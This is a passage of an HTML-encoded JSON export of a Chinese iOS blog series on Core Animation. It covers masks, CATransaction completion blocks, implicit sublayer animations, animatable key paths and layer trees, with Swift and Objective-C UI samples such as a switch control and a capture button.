CGRect(x: 50, y: 0, width: 100, height: 100) &lt;&#x3D;&#x3D;&#x3D;使用maskLayer来控制大小&#x2F;&#x2F;Use Sublayer Control Alphalet mask: UIView &#x3D; UIView(frame: view.bounds) &lt;&#x3D;&#x3D;&#x3D;&#x3D;注意这里mask恢复到了和view一样大小mask.layer.addSublayer(maskLayer)view.mask &#x3D; mask 此时只要更改 maskLayer 的Frame就可以获得带有动画效果Frame变化 一个音量变化的示例如果想做麦克风音量变化、WiFi信号强度的变化的动画，可以使用这种方式，下面是一个麦克风音量变化的Demo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public class SoundVolumeView : UIView &#123; &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Logic &#x2F;&#x2F;----------------------------------- public var percent: CGFloat &#x3D; 1 &#123; didSet &#123; percent &#x3D; percent &gt; 1 ? 1:(percent &lt; 0 ? 0 : percent) let width &#x3D; on.bounds.size.width * percent blockLayer.frame &#x3D; CGRect(x: 0, y: 0, width: width, height: on.bounds.size.height) &#125; &#125; &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Private &#x2F;&#x2F;----------------------------------- private let blockLayer: CALayer &#x3D; CALayer() private let off: UIImageView &#x3D; UIImageView(image: UIImage.init(framework: &quot;uisit_sound_volume_off&quot;)) private let on: UIImageView &#x3D; UIImageView(image: UIImage.init(framework: &quot;uisit_sound_volume_on&quot;)) private let blockView: UIView &#x3D; UIView() &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Override &#x2F;&#x2F;----------------------------------- override public init(frame: CGRect) &#123; super.init(frame: frame) setupSound() constraintFrame() patternSound() &#125; required public init?(coder aDecoder: NSCoder) &#123; super.init(coder: aDecoder) &#125; &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Keep Frame &#x2F;&#x2F;----------------------------------- override public func layoutSubviews() &#123; super.layoutSubviews() if !self.bounds.equalTo(blockView.bounds) &#123; constraintFrame() &#125; &#125; func setupSound() &#123; self.addSubview(off) self.addSubview(on) &#125; func constraintFrame() &#123; off.frame &#x3D; self.bounds on.frame &#x3D; self.bounds blockView.frame &#x3D; self.bounds blockLayer.frame &#x3D; self.bounds &#125; func patternSound() &#123; blockLayer.backgroundColor &#x3D; UIColor.white.cgColor blockView.layer.addSublayer(blockLayer) on.mask &#x3D; blockView &#125;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CoreAnimation","slug":"CoreAnimation","permalink":"http://yoursite.com/tags/CoreAnimation/"}]},{"title":"CAAnimation(七) 利用CATransaction完成动画平滑过度","date":"2017-04-06T15:00:00.000Z","path":"2017/04/07/CAAnimation七利用CATransaction完成动画平滑过度/","text":"任意值动画的平滑需求在上文利用SubLayer完成线性动画中我们提到了可以使用SubLayer完成线性动画，主要的好处是 不用手动去处理动画PresentTree的控制(避免闪烁) 不用考虑动画的中间状态(不用考虑动画过程) 以下是一个相机Capture按键的的需求 用户操作 动画状态 按下Press 按键缩小 未抬起Hold 按键缩小到最小值保持尺寸 抬起Trick 按键放大，并且开始Loading动画 拍摄Loading 按键尺寸在最大和最小值之间过度 拍摄完成 无论按键处于哪个过程，马上返回原始尺寸 平滑动画面临的问题这里最难处理的就是，在拍摄完成时，按键的动画 有可能处于 大—&gt;小 也有可能处于 小—&gt;大 这里需要根据当前的Present Tree处于哪个过程来决定 大—&gt;小: 此时需要马上停止动画，返回最大的尺寸 小—&gt;大: 此时需要继续执行动画到最大尺寸 如果采用雷达动画中的Property Animation 我们很难去界定动画的 fromValue 根据Property的动画原理可以知道当前的显示由PresentTree决定，网上的回答都提到了该方法 CABasicAnimation start from current layer position Cannot get current position of CALayer during animation 但是上文也提到了两个不可避免的问题 通过 PresentLayer 拿到当前的显示值很难准确定位 如何控制剩余的动画时间 根据面临的问题下文给出 CATransaction解决方案 以及 失败的 Property的尝试 创建一个自定义的控件 函数 目的 touchesBegan 在开始触摸时进入hold状态 touchesEnded 在触摸结束时，进入摄像状态，并且尝试返回normal状态 interrupt 无论动画处于何种状态，都打断动画返回normal状态 1234567891011121314151617181920212223242526272829class CaptureButton: UIControl &#123; let capture &#x3D; CaptureLayer(color: nil) override init(frame: CGRect) &#123; super.init(frame: frame) self.layer.addSublayer(capture) &#125; required init?(coder aDecoder: NSCoder) &#123; super.init(coder: aDecoder) self.layer.addSublayer(capture) &#125; public func interrupt() &#123; capture.shooting &#x3D; false capture.normalState() &#125; override func touchesBegan(_ touches: Set&lt;UITouch&gt;, with event: UIEvent?) &#123; capture.holdState() &#125; override func touchesEnded(_ touches: Set&lt;UITouch&gt;, with event: UIEvent?) &#123; capture.shooting &#x3D; true capture.normalState() &#125;&#125; CATransaction解决方案根据文章隐式动画的原理，注意completion的书写顺序，可以完成两个状态的动画控制 对比Property动画明显可以发现控制逻辑更加简单 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class CaptureLayer: CALayer &#123; private let backgroundLayer: CALayer &#x3D; CALayer() private let holdLayer: CALayer &#x3D; CALayer() public var shooting: Bool &#x3D; false convenience init(color: UIColor?) &#123; self.init() self.frame &#x3D; CGRect(x: 0, y: 0, width: 50, height: 50) self.addSublayer(backgroundLayer) backgroundLayer.addSublayer(holdLayer) &#x2F;&#x2F; backgroundLayer.backgroundColor &#x3D; UIColor.purple.cgColor backgroundLayer.cornerRadius &#x3D; 25 backgroundLayer.frame &#x3D; self.bounds &#x2F;&#x2F; holdLayer.backgroundColor &#x3D; color?.cgColor ?? UIColor.yellow.cgColor holdLayer.cornerRadius &#x3D; 20 holdLayer.bounds &#x3D; CGRect(x: 0, y: 0, width: 40, height: 40) holdLayer.position &#x3D; backgroundLayer.position &#125; &#x2F;&#x2F;SubLayer public func normalState() &#123; CATransaction.begin() if shooting &#123; CATransaction.setCompletionBlock(&#123; self.holdState() &#125;) &#125; CATransaction.setAnimationDuration(1) backgroundLayer.opacity &#x3D; 1 backgroundLayer.transform &#x3D; CATransform3DIdentity CATransaction.commit() &#125; public func holdState() &#123; CATransaction.begin() if shooting &#123; CATransaction.setCompletionBlock(&#123; self.normalState() &#125;) &#125; CATransaction.setAnimationDuration(1) backgroundLayer.opacity &#x3D; 0.5 backgroundLayer.transform &#x3D; CATransform3DScale(CATransform3DIdentity, 0.5, 0.5, 1.0) CATransaction.commit() &#125;&#125; Property的尝试(失败，如果谁能找到解决方法希望留言)使用Property动画我们明显可以发现，由于AnimateGroup的创建，我们明显需要更多的代码来控制逻辑 并且在 interrupt 函数触发时，很难控制动画的闪烁效果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121class CaptureProperty: UIControl, CAAnimationDelegate &#123; private let backgroundLayer: CALayer &#x3D; CALayer() private let holdLayer: CALayer &#x3D; CALayer() public var shooting: Bool &#x3D; false private let normalAnim: CAAnimationGroup &#x3D; CAAnimationGroup() private let holdAnim: CAAnimationGroup &#x3D; CAAnimationGroup() convenience init(color: UIColor?) &#123; self.init(frame: CGRect(x: 100, y: 100, width: 50, height: 50)) self.layer.addSublayer(backgroundLayer) self.layer.addSublayer(holdLayer) &#x2F;&#x2F; backgroundLayer.backgroundColor &#x3D; UIColor.purple.cgColor backgroundLayer.cornerRadius &#x3D; 25 backgroundLayer.frame &#x3D; self.bounds &#x2F;&#x2F; holdLayer.backgroundColor &#x3D; color?.cgColor ?? UIColor.yellow.cgColor holdLayer.cornerRadius &#x3D; 20 holdLayer.bounds &#x3D; CGRect(x: 0, y: 0, width: 40, height: 40) holdLayer.position &#x3D; backgroundLayer.position &#x2F;&#x2F; normalAnimation(group: normalAnim) holdAnimation(group: holdAnim) &#125; public func normalState() &#123; self.layer.add(normalAnim, forKey: &quot;Anim&quot;) &#125; public func holdState() &#123; self.layer.add(holdAnim, forKey: &quot;Anim&quot;) &#125; public func normalAnimation(group: CAAnimationGroup) &#123; let scale: CABasicAnimation &#x3D; CABasicAnimation(keyPath: &quot;transform.scale.xy&quot;) let opcity: CABasicAnimation &#x3D; CABasicAnimation(keyPath: &quot;opacity&quot;) scale.toValue &#x3D; 1.0 opcity.toValue &#x3D; 1.0 group.animations &#x3D; [scale,opcity] group.duration &#x3D; 1.0 group.delegate &#x3D; self group.fillMode &#x3D; kCAFillModeForwards group.isRemovedOnCompletion &#x3D; false &#125; public func holdAnimation(group: CAAnimationGroup) &#123; let scale: CABasicAnimation &#x3D; CABasicAnimation(keyPath: &quot;transform.scale.xy&quot;) let opcity: CABasicAnimation &#x3D; CABasicAnimation(keyPath: &quot;opacity&quot;) scale.toValue &#x3D; 0.5 opcity.toValue &#x3D; 0.5 group.animations &#x3D; [scale,opcity] group.duration &#x3D; 1.0 group.delegate &#x3D; self group.fillMode &#x3D; kCAFillModeForwards group.isRemovedOnCompletion &#x3D; false &#125; func animationDidStop(_ anim: CAAnimation, finished flag: Bool) &#123; let group:CAAnimationGroup &#x3D; (anim as! CAAnimationGroup) if (group.animations?.elementsEqual(holdAnim.animations!))! &#123; self.layer.opacity &#x3D; 0.5 self.layer.transform &#x3D; CATransform3DScale(CATransform3DIdentity, 0.5, 0.5, 1.0) if shooting &#123; self.layer.add(normalAnim, forKey: &quot;Anim&quot;) &#125; &#125;else if (group.animations?.elementsEqual(normalAnim.animations!))! &#123; self.layer.opacity &#x3D; 1 self.layer.transform &#x3D; CATransform3DIdentity if shooting &#123; self.layer.add(holdAnim, forKey: &quot;Anim&quot;) &#125; &#125; &#125; public func interrupt() &#123; self.shooting &#x3D; false let group: CAAnimationGroup &#x3D; CAAnimationGroup() let scale: CABasicAnimation &#x3D; CABasicAnimation(keyPath: &quot;transform&quot;) let opcity: CABasicAnimation &#x3D; CABasicAnimation(keyPath: &quot;opacity&quot;) scale.fromValue &#x3D; self.layer.presentation()?.transform opcity.fromValue &#x3D; self.layer.presentation()?.opacity scale.toValue &#x3D; 1.0 opcity.toValue &#x3D; 1.0 group.animations &#x3D; [scale,opcity] group.duration &#x3D; 1.0 group.fillMode &#x3D; kCAFillModeForwards group.isRemovedOnCompletion &#x3D; false self.layer.add(group, forKey: &quot;Anim&quot;) &#125; override func touchesBegan(_ touches: Set&lt;UITouch&gt;, with event: UIEvent?) &#123; holdState() &#125; override func touchesMoved(_ touches: Set&lt;UITouch&gt;, with event: UIEvent?) &#123; &#125; override func touchesEnded(_ touches: Set&lt;UITouch&gt;, with event: UIEvent?) &#123; shooting &#x3D; true normalState() &#125;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CoreAnimation","slug":"CoreAnimation","permalink":"http://yoursite.com/tags/CoreAnimation/"}]},{"title":"CAAnimation(六) 利用SubLayer完成线性动画","date":"2017-04-05T15:00:00.000Z","path":"2017/04/06/CAAnimation六利用SubLayer完成线性动画/","text":"利用SubLayer完成动画在某些动画中，我们希望可以追踪用户的操作，并且在用户完成操作后到达某个状态，例如UISwitch，具有以下特性 如果你按住中间的小圆圈，小圆圈时可以变形和拖动的 拖动时会动态改变背景色 当松手后，总会恢复某一个状态 on/off on 和 off的动画效果不一致 这时我们可以借助于SubLayer的隐式动画来完成对苹果UISwitch的模仿 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212class SwithButton: UIControl &#123; &#x2F;&#x2F;--------------------------------------------------------------------- &#x2F;&#x2F; MARK: Layer &#x2F;&#x2F;--------------------------------------------------------------------- let offLayer: CALayer &#x3D; CALayer() let onLayer: CALayer &#x3D; CALayer() let thumbLayer: CALayer &#x3D; CALayer() &#x2F;&#x2F;--------------------------------------------------------------------- &#x2F;&#x2F; MARK: Switch Button Attribute &#x2F;&#x2F;--------------------------------------------------------------------- public var on:Bool &#x3D; false &#123; didSet &#123; on ? layerStateOn() : layerStateOff() &#125; &#125; &#x2F;&#x2F;--------------------------------------------------------------------- &#x2F;&#x2F; MARK: Assign Attribute &#x2F;&#x2F;--------------------------------------------------------------------- var onRect: CGRect &#x3D; CGRect.zero var offRect: CGRect &#x3D; CGRect.zero var diameter: CGFloat &#x3D; 0 &#x2F;&#x2F; thumb size diameter var thumbOnX: CGFloat &#x3D; 0 &#x2F;&#x2F; thumb origin X when on state var thumbOffX: CGFloat &#x3D; 0 &#x2F;&#x2F; thumb origin X when off state var holdWidth: CGFloat &#x3D; 0 &#x2F;&#x2F; thumb size width when hold the thumb var holdOnX: CGFloat &#x3D; 0 &#x2F;&#x2F; thumb origin X when holding thumb during on state public var offColor: UIColor &#x3D; UIColor.white.withAlphaComponent(0.4) public var onColor: UIColor &#x3D; UIColor.green.withAlphaComponent(0.4) public var thumbColor: UIColor &#x3D; UIColor.white &#x2F;&#x2F;--------------------------------------------------------------------- &#x2F;&#x2F; MARK: Tempory Attribute &#x2F;&#x2F;--------------------------------------------------------------------- private var beginX: CGFloat &#x3D; 0 &#x2F;&#x2F;--------------------------------------------------------------------- &#x2F;&#x2F; MARK: Override Method &#x2F;&#x2F;--------------------------------------------------------------------- override init(frame: CGRect) &#123; super.init(frame: frame) calculateAttributes(size: frame.size) setupSubLayer() patternSubLayer() &#125; required init?(coder aDecoder: NSCoder) &#123; fatalError(&quot;SwitchButton should use frame initalize function&quot;) &#125; override func layoutSublayers(of layer: CALayer) &#123; super.layoutSublayers(of: layer) if onRect !&#x3D; self.bounds &#123; calculateAttributes(size: self.bounds.size) &#125; &#125; &#x2F;&#x2F;--------------------------------------------------------------------- &#x2F;&#x2F; MARK: Setup Layer &#x2F;&#x2F;--------------------------------------------------------------------- private func calculateAttributes(size: CGSize) &#123; onRect &#x3D; CGRect(origin: CGPoint.zero, size: size) diameter &#x3D; size.height - 2 offRect &#x3D; CGRect(x: 2, y: 2, width: diameter-2, height: diameter-2) thumbOnX &#x3D; size.width - diameter - 1 thumbOffX &#x3D; 1 holdWidth &#x3D; ceil(diameter*1.25) holdOnX &#x3D; size.width - holdWidth - 1 &#125; private func setupSubLayer() &#123; self.layer.addSublayer(offLayer) self.layer.addSublayer(onLayer) self.layer.addSublayer(thumbLayer) &#125; private func patternSubLayer() &#123; &#x2F;&#x2F;Self self.layer.cornerRadius &#x3D; onRect.height&#x2F;2 &#x2F;&#x2F;Off offLayer.cornerRadius &#x3D; onRect.height&#x2F;2 offLayer.frame &#x3D; onRect if offImage &#x3D;&#x3D; nil &#123; offLayer.backgroundColor &#x3D; offColor.cgColor offLayer.borderColor &#x3D; UIColor.white.withAlphaComponent(0.5).cgColor offLayer.borderWidth &#x3D; 0.5 &#125; &#x2F;&#x2F;On onLayer.cornerRadius &#x3D; onRect.height&#x2F;2 if onImage &#x3D;&#x3D; nil &#123; onLayer.backgroundColor &#x3D; onColor.cgColor &#125; &#x2F;&#x2F;Rhumb thumbLayer.cornerRadius &#x3D; diameter&#x2F;2 if thumbImage &#x3D;&#x3D; nil &#123; thumbLayer.backgroundColor &#x3D; thumbColor.cgColor thumbLayer.shadowOffset &#x3D; CGSize(width: 0, height: 1) thumbLayer.shadowColor &#x3D; UIColor.black.withAlphaComponent(0.5).cgColor thumbLayer.shadowRadius &#x3D; 2 thumbLayer.shadowOpacity &#x3D; 0.8 &#125; &#x2F;&#x2F;State layerStateOff() &#125; &#x2F;&#x2F;--------------------------------------------------------------------- &#x2F;&#x2F; MARK: Pattern State &#x2F;&#x2F;--------------------------------------------------------------------- func layerStateOn() &#123; onLayer.frame &#x3D; onRect thumbLayer.frame &#x3D; CGRect(x: thumbOnX, y: 1, width: diameter, height: diameter) &#125; func layerStateOff() &#123; onLayer.frame &#x3D; offRect thumbLayer.frame &#x3D; CGRect(x: thumbOffX, y: 1, width: diameter, height: diameter) &#125; func layerStateMoving(touch: UITouch) &#123; &#x2F;&#x2F;The performance during moving finger let pointX: CGFloat &#x3D; touch.location(in: touch.view).x let prePointX: CGFloat &#x3D; touch.previousLocation(in: touch.view).x; &#x2F;&#x2F;Like the Original design,thumb moved match the offset,not the absolute touch position let offset: CGFloat &#x3D; pointX - prePointX; if(offset &#x3D;&#x3D; 0 ) &#123; return; &#125; var thumbOriginX: CGFloat &#x3D; thumbLayer.frame.origin.x + offset; &#x2F;&#x2F;if the x smaller than 1, it should be 1 thumbOriginX &#x3D; min(max(thumbOffX, thumbOriginX), holdOnX) onLayer.frame &#x3D; CGRect(x: 0, y: 0, width: thumbOriginX+diameter, height: onRect.height) thumbLayer.frame &#x3D; CGRect(x: thumbOriginX, y: 1, width: holdWidth, height: diameter) &#125; &#x2F;&#x2F;--------------------------------------------------------------------- &#x2F;&#x2F; MARK: Touch Life Cycle &#x2F;&#x2F;--------------------------------------------------------------------- override func beginTracking(_ touch: UITouch, with event: UIEvent?) -&gt; Bool &#123; touchPhaseBegin(touch: touch) return super.beginTracking(touch, with: event) &#125; override func continueTracking(_ touch: UITouch, with event: UIEvent?) -&gt; Bool &#123; touchPhaseMoveStationary(touch: touch) return super.continueTracking(touch, with: event) &#125; override func endTracking(_ touch: UITouch?, with event: UIEvent?) &#123; if touch !&#x3D; nil &#123; touchPhaseEndCancel(touch: touch!) &#125; super.endTracking(touch, with: event) &#125; override func cancelTracking(with event: UIEvent?) &#123; for touch in (event?.touches(for: self))! &#123; touchPhaseEndCancel(touch: touch) &#125; super.cancelTracking(with: event) &#125; private func touchPhaseBegin(touch: UITouch) &#123; &#x2F;&#x2F;record fist touch position beginX &#x3D; touch.previousLocation(in: touch.view).x &#x2F;&#x2F;Transform thumb expand and fade all self.layer.opacity &#x3D; 0.5 let originX &#x3D; max(min(holdOnX, thumbLayer.frame.origin.x), thumbOffX) thumbLayer.frame &#x3D; CGRect(x: originX, y: thumbLayer.frame.origin.y, width: holdWidth, height: diameter) &#125; private func touchPhaseMoveStationary(touch: UITouch) &#123; let pointX: CGFloat &#x3D; touch.location(in: touch.view).x &#x2F;&#x2F;if finger touched and did not offset DON&#39;T CHANGE ON_LAYER &#x2F;&#x2F;(but now touch life cycle listening continue as moved with same positionX) if(beginX !&#x3D; pointX) &#123; layerStateMoving(touch: touch) &#125; &#125; private func touchPhaseEndCancel(touch: UITouch) &#123; &#x2F;&#x2F;Cancel fade self.layer.opacity &#x3D; 1 let thumbX: CGFloat &#x3D; thumbLayer.frame.origin.x+thumbLayer.frame.size.width&#x2F;2; let pointX: CGFloat &#x3D; touch.location(in: touch.view).x let center: CGFloat &#x3D; onRect.width&#x2F;2 &#x2F;&#x2F;decide is ON state by comparing thumbX and the center var isOn: Bool &#x3D; thumbX &gt;&#x3D; center &#x2F;&#x2F;if just touch and not enter continue life cycle, switch the state &#x2F;&#x2F;but it has little chance the finger moved and return the begin point,what a stick finger can do it. if(beginX &#x3D;&#x3D; pointX) &#123; isOn &#x3D; !on; &#125; &#x2F;&#x2F;Set State and Animation to confirm frame rather than stock in the middle if(on !&#x3D; isOn) &#123; on &#x3D; isOn; &#x2F;&#x2F;invoke the value change event &#x2F;&#x2F;Cause we subclass the UIControl, we do not need invoke touchUpInside manually self.sendActions(for: .valueChanged) &#125; &#x2F;&#x2F;Animate to final state by &quot;on&quot; on ? layerStateOn() : layerStateOff() &#125;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CoreAnimation","slug":"CoreAnimation","permalink":"http://yoursite.com/tags/CoreAnimation/"}]},{"title":"CAAnimation(五) 部分动画示例-雷达、旋转","date":"2017-04-04T15:00:00.000Z","path":"2017/04/05/CAAnimation五雷达旋转动画/","text":"代码示例雷达动画雷达动画是动态改变Scale和透明度来完成呼吸灯效果的 12345678910111213141516171819202122232425- (CAAnimationGroup *)breathAnimation &#123; &#x2F;&#x2F;使用CABasicAnimation控制脉冲的大小 CABasicAnimation *scaleAnimation &#x3D; [CABasicAnimation animationWithKeyPath:@&quot;transform.scale.xy&quot;]; scaleAnimation.fromValue &#x3D; @0.5; scaleAnimation.toValue &#x3D; @1.0; &#x2F;&#x2F;使用CAKeyframeAnimation来设置透明度渐变 CAKeyframeAnimation *opacityAnimation &#x3D; [CAKeyframeAnimation animationWithKeyPath:@&quot;opacity&quot;]; opacityAnimation.values &#x3D; @[@0.45, @0.45, @0]; opacityAnimation.keyTimes &#x3D; @[@0, @0.2, @1]; opacityAnimation.removedOnCompletion &#x3D; NO; &#x2F;&#x2F; CAAnimationGroup *animationGroup &#x3D; [CAAnimationGroup animation]; animationGroup.duration &#x3D; 2;&#x2F;&#x2F;每次持续时长 animationGroup.repeatCount &#x3D; INFINITY;&#x2F;&#x2F;重复次数 animationGroup.removedOnCompletion &#x3D; NO;&#x2F;&#x2F;结束后是否移除 animationGroup.timingFunction &#x3D; [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseIn];&#x2F;&#x2F;时间函数控制动画节奏 NSArray *animations &#x3D; @[scaleAnimation, opacityAnimation]; animationGroup.animations &#x3D; animations; return animationGroup;&#125; 旋转动画让视图围绕Z轴旋转，便可作出在XY平面上(屏幕)的旋转效果 12345678910- (CABasicAnimation)runSpinAnimationOnView &#123; CABasicAnimation* rotationAnimation; rotationAnimation &#x3D; [CABasicAnimation animationWithKeyPath:@&quot;transform.rotation.z&quot;]; rotationAnimation.toValue &#x3D; [NSNumber numberWithFloat: M_PI * 2.0]; rotationAnimation.duration &#x3D; 2.0; rotationAnimation.cumulative &#x3D; YES; rotationAnimation.repeatCount &#x3D; 3; rotationAnimation.removedOnCompletion &#x3D; YES; return rotationAnimation;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CoreAnimation","slug":"CoreAnimation","permalink":"http://yoursite.com/tags/CoreAnimation/"}]},{"title":"CAAnimation(四) SubLayer隐式动画的关闭和Completion技巧","date":"2017-04-03T15:00:00.000Z","path":"2017/04/04/CAAnimation四SubLayer隐式动画的关闭和Completion技巧/","text":"SubLayer的自带隐式动画如果我直接对一个CALayer添加SubLayer 123456789101112&#x2F;&#x2F;SubLayerCALayer *onLayer &#x3D; [CALayer layer];CALayer *thumbLayer &#x3D; [CALayer layer];&#x2F;&#x2F;Add Layer[self.layer addSublayer:onLayer];[self.layer addSublayer:thumbLayer];&#x2F;&#x2F;Process SubLayer Properties[onLayer setFrame:self.layer.bound];[thumbLayer setFrame:CGRectMake(_thumbOnX, 1, _diameter, _diameter)]; 在处理SubLayer的属性SetFrame时，被添加的SubLayer会从当前的状态通过一个 隐式动画 过度到目标状态，但是SuperLayer不会，例如 12&#x2F;&#x2F; No Implicit Animation[self.layer setFrame:CGRectZero]; 如何关闭自带的隐式动画我们可以通过隐式动画的事务控制方法来关闭隐式动画， 123456789[CATransaction begin];[CATransaction setValue:(id)kCFBooleanTrue forKey:kCATransactionDisableActions];[onLayer setFrame:self.layer.bound];[thumbLayer setFrame:CGRectMake(_thumbOnX, 1, _diameter, _diameter)];[CATransaction commit]; 或者 12345678[CATransaction begin];[CATransaction setDisableActions:YES];[onLayer setFrame:self.layer.bound];[thumbLayer setFrame:CGRectMake(_thumbOnX, 1, _diameter, _diameter)];[CATransaction commit]; 原理就是在事务中包裹了一个事务，在被包裹的事务中定义Action不生效，参考文章StackOverflow 隐式动画 CompletionBlock的设定在 CATransaction 的事务控制中，如果想要在其完成后设定Completion必须在形变设定之前，最好在 begin 后直接开始设置, 不然调用的时机的异常 1234567891011[CATransaction begin];[CATransaction setCompletionBlock:^&#123; ......&#x2F;&#x2F;&#125;];[CATransaction setAnimationDuration:0.5];[button.back setOpacity:0.5];[button.back setTransform:CATransform3DScale(CATransform3DIdentity, 0.9, 0.9, 1.0)];[CATransaction commit]; 产生这个问题的原因，根据StackOverlay的回答 和 官方文档中Discussion部分 中提到的这个关键词 subsequently 1.....as soon as all animations ！！！subsequently added！！！by this transaction group have completed (or have been removed.) ..... 也就是说 CompletionBlock会在 整个begin….commit之间其之后 的动画设定完成后执行,所以不能够以这种方式书写 123456789101112[CATransaction begin];[CATransaction setAnimationDuration:0.5];[button.back setOpacity:0.5];[button.back setTransform:CATransform3DScale(CATransform3DIdentity, 0.9, 0.9, 1.0)];[CATransaction setCompletionBlock:^&#123; ......&#x2F;&#x2F;&#125;]; &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;此处没有动画，所以可能上文动画还未完成，马上就执行了CompletionBlock[CATransaction commit];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CoreAnimation","slug":"CoreAnimation","permalink":"http://yoursite.com/tags/CoreAnimation/"}]},{"title":"CAAnimation(三) 可用的动画KeyPath","date":"2017-04-02T15:00:00.000Z","path":"2017/04/03/CAAnimation三可用的动画KeyPath/","text":"有哪些属性可以被动画好多有关CAAnimation的文章中，都设定了一个KeyPath，但是很少有文章具体提到了所有可以被Animation的属性，而苹果官方文档中也没有明确给出目录，而是把链接放在Core Animation Basics段落 Layer-Based Animations 的最后， trigger animations, see Animatable Properties 提到了可以做动画的所有属性 属性列表 anchorPoint backgroundColor backgroundFilters borderColor borderWidth bounds compositingFilter contents contentsRect cornerRadius doubleSided filters frame hidden mask masksToBounds opacity position shadowColor shadowOffset shadowOpacity shadowPath shadowRadius sublayers sublayerTransform transform zPosition 其中比较特殊的是 doubleSided ： 不会自带隐式动画，必须显式声明 compositingFilter、backgroundFilters： 可以使用于CATransition动画 frame： 这个属性不能被做动画，可以做动画的是 bounds 和 position","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CoreAnimation","slug":"CoreAnimation","permalink":"http://yoursite.com/tags/CoreAnimation/"}]},{"title":"CAAnimation(二) 动画的原理","date":"2017-04-01T15:00:00.000Z","path":"2017/04/02/CAAnimation二动画的原理/","text":"CAAnimation的原理在官方文档的章节 “Layer Trees Reflect Different Aspects of the Animation State” 中讲到了动画的原理，在任何一个Core Animation系统中都有三个Layer Tree Model Layer Tree ： Model树，用来储存任何动画的Target Value，比如我要旋转ALayer的Transform，ALayer本身就是在这个树中，也是我们交互最多的 Presentation Tree ：展示树，虽然叫展示树，但是它并不是真是的显示在屏幕上，而是Model树的一份拷贝，当动画执行过程中，变动的是这个树上的数值，如果想要获取到实时的数值，可以通过属性presentationLayer来访问 Render Tree：渲染树，这个才是最终显示在屏幕上使用的对象，它是Core Animation 的私有类，无法访问 可以看到官方文档给出的图解 通过文档解释我们可以了解到，每一个Layer动画在执行时，都存在三份，原本的Layer数据层Model，和动画的操作层Presentation，以及显示图层Render，这个概念会收到动画一些设定影响，比如 “isCumulative” CAAnimation与CAMediaTimingCAAnimation是所有动画的基类，其自身提供一些动画效果的控制能力，以及通过实现协议CAMediaTiming来完成一些通用动画设定 属性 能力 提供者 timingFunction timing控制函数 CAAnimation isRemovedOnCompletion 完成后是否移除动画图层 CAAnimation delegate 代理能力，用于获取begin和end CAAnimation 属性 能力 提供者 beginTime 显而易见～开始时间 CAMediaTiming duration 显而易见～持续时间 CAMediaTiming speed 显而易见～动画速度 CAMediaTiming repeatCount 显而易见～重复次数 CAMediaTiming repeatDuration 显而易见～重复时的持续时间 CAMediaTiming timeOffset 用于控制自身和父级Object的时间关系函数 CAMediaTiming autoreverses 是否自动倒放动画，即按照运动轨迹返回初始位置 CAMediaTiming fillMode 在超出了动画时间之后，展现哪个状态 CAMediaTiming timeOffset的计算公式1timeSelf &#x3D; (timeParent - beginTime) * speed + timeOffset 用于控制自身时间和父级时间的关系，在文档中说，一个实用的例子就是通过设置speed=0，然后设定一个timeOffset=5来达到暂停效果，让动画始终停止在5s时候的状态 fillMode的可选值fillMode的可选值有四个 backwards（开始）、 forwards（结束） 、both （开始和结束）、removed（移除） 比较奇怪的是这个Both开始和结束，猜测是根据在动画结束后，当时处于何种状态就展示哪种状态，默认值为移除 CAPropertyAnimation根据文章动画的继承树描述，我们可以得知 CAPropertyAnimation继承于CAAnimation，自身和基类主要提供了以下方法 属性 能力 提供者 keyPath 决定了在哪个属性上做动画，很重要！！ CAPropertyAnimation isAdditive 是否影响到原图层Model Tree，参见动画的继承树 CAPropertyAnimation isCumulative 是否以前一个动画的结束值，作为当前动画的开始值 CAPropertyAnimation valueFunction value控制函数 CAPropertyAnimation 在 CAPropertyAnimation 的基础上，衍生出了关键帧动画(CAKeyframeAnimation) 和 基本动画 (CABasicAnimation) CABasicAnimationCABasicAnimation 提供了以下三个值，来控制动画，注意这三个值都是id类型的，是因为根据 CAPropertyAnimation中 keyPath的不同，会使用不同的单位 属性 范围 fromValue 从fromValue到Render Tree的当前Value toValue 从Render Tree的当前Value到 toValue byValue 从Render Tree的当前Value 到 当前Value加上byValue 可以使用的组合方式分为两种 fromValue + toValue : 这种很好理解，就是从最小值到最大值 fromValue + byValue : byValue的意思是增量值，即从fromValue 到 fromValue+byValue CAKeyframeAnimation与Basic动画不同的是，KeyFrame动画是通过关键帧来控制的动画，其包括的属性如下 属性 类型 范围 keyTimes NSArray&lt;NSNumber *&gt; 关键帧设定，是一个数组，但是必须是 由0到1组成 ，其会根据百分比与CAMediaTiming协议设定的duration进行换算 values NSArray 类似于Basic的value，但是是一个数组，对应每一个keyTimes path CGPathRef 与values二选一，会把path自动平分成value值 timingFunctions NSArray 时间函数，也是数组，可以针对不同的关键帧之间用不同的时间函数 calculationMode NSString 积累模式 tensionValues NSArray 一些状态控制参数，不太懂 continuityValues NSArray 一些状态控制参数，不太懂 biasValues NSArray 一些状态控制参数，不太懂 rotationMode NSString 